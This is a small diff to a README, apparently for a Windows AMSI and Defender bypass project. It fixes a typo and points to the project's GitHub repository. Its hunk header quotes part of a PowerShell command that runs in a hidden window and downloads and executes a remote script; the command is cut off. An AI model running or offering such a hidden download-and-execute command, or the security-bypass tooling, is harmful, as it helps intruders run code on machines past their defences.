@@ -67,7 +67,7 @@ powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt
 
 You can make only one call by creating another .ps1
 
-All of these scripts are goint to be in: 
+These scripts are going to be in this repository: 
 ----------------------------------------
 https://github.com/Filiplain/Windows-AMSI-Defender-Bypass
 
